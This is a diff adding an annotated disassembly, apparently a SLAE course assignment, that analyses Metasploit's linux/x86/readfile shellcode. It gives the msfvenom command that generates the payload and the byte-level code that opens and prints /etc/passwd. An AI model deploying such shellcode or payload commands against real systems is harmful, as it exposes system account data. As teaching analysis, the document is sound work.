@@ -1,0 +1,53 @@
+; SLAE-xxx
+; thanks to previous students write ups 
+; assignment 5.3: analyse metasploit shellcodes
+; originality: lets check syscall for readfile 
+; msfvenom -p linux/x86/readfile -f raw PATH="/etc/passwd" > msfcmdread.raw
+
+; here are the syscalls used by this shellcode: open,read,write 
+
+; first it jumps to 0x38 
+00000000  EB36              jmp short 0x38 ; jump
+
+; the following is syscall open 
+00000002  B805000000        mov eax,0x5; prepare the open syscall
+; here is the function 
+; int open(const char *pathname, int flags);
+00000007  5B                pop ebx ; the string is inside the ebx register 
+00000008  31C9              xor ecx,ecx ; 0 as flags, so O_RDONLY 
+0000000A  CD80              int 0x80
+;cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 5 
+;#define __NR_open		  5
+; open("/etc/passwd", O_RDONLY)           = 3
+
+; the following is syscall read 
+0000000C  89C3              mov ebx,eax ; store the resulting fd in ebx 
+0000000E  B803000000        mov eax,0x3 ; syscall read 
+; #define __NR_read		  3
+00000013  89E7              mov edi,esp ; stack address to edi 
+00000015  89F9              mov ecx,edi ; destination of the read is the stack :] 
+00000017  BA00100000        mov edx,0x1000 ; size to 4096 
+0000001C  CD80              int 0x80 ; syscall 
+
+; the following is syscall write
+; function is ssize_t write(int fd, const void *buf, size_t count); 
+0000001E  89C2              mov edx,eax ; result is inside edx, edx is the size  
+00000020  B804000000        mov eax,0x4 ; syscal write 
+00000025  BB01000000        mov ebx,0x1 ; output to stdout = 1, ebx is fd  
+; for info ecx still points to the string read and is argument 2, ecx is the buffer 
+0000002A  CD80              int 0x80 ; syscall 
+
+; syscall exit , clean exit 
+0000002C  B801000000        mov eax,0x1
+00000031  BB00000000        mov ebx,0x0
+00000036  CD80              int 0x80
+
+; jump here 
+00000038  E8C5FFFFFF        call dword 0x2 ; call 0x2, and push the return address onto the stack 
+
+; so the following bytes are probably a string, and not random opcodes 
+0000003D  2F                das [...] ; wrong disass
+; surprise surprise :] lets check string 
+hd -s 0x3d msfread.raw 
+0000003d  2f 65 74 63 2f 70 61 73  73 77 64 00              |/etc/passwd.|
+; this is the path we want to open 
